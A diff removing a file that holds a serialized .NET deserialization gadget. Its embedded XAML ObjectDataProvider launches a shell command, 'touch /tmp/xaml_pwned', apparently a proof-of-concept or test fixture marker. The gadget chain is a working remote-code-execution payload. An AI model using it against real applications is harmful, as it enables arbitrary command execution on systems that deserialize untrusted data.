@@ -1,10 +1,0 @@
-����ÿÿÿÿ����������^Microsoft.PowerShell.Editor, Version=3.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35���BMicrosoft.VisualStudio.Text.Formatting.TextFormattingRunProperties���ForegroundBrush������Ó<?xml version="1.0" encoding="utf-16"?>
-<ObjectDataProvider MethodName="Start" IsInitialLoadEnabled="False" xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation" xmlns:sd="clr-namespace:System.Diagnostics;assembly=System" xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml">
-<ObjectDataProvider.ObjectInstance>
-<sd:Process>
-<sd:Process.StartInfo>
-<sd:ProcessStartInfo Arguments="/bin/bash -c 'touch /tmp/xaml_pwned'" StandardErrorEncoding="{x:Null}" StandardOutputEncoding="{x:Null}" UserName="" Password="{x:Null}" Domain="" LoadUserProfile="False" FileName="sh " />
-</sd:Process.StartInfo>
-</sd:Process>
-</ObjectDataProvider.ObjectInstance>
-</ObjectDataProvider>
